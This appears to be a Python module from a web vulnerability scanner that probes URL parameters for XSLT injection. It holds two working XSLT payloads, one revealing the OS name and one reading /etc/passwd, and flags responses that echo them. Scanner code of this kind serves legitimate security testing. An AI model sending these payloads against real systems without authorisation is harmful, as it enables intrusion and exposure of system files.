import copy
import re
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


class XsltInjectionCheck(BaseCheck):
    name = "active_xslt_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        payloads = [
            '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property(\'os.name\')"/></xsl:template></xsl:stylesheet>',
            '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
        ]
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for param in target_params:
                for payload in payloads:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        indicators = ["Windows", "Linux", "Mac OS X", "root:", "daemon:", "xsl:value-of"]
                        for indicator in indicators:
                            if indicator in resp.text:
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="critical",
                                    title="XSLT injection detected",
                                    description=f"Parameter '{param}' processed XSLT and returned system information.",
                                    evidence=f"Indicator: {indicator}\nResponse snippet: {resp.text[:200]}",
                                    remediation="Disable XSLT processing of user-supplied stylesheets. Use parameterised XSLT transformation.",
                                    cwe="CWE-91",
                                ))
                                break
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
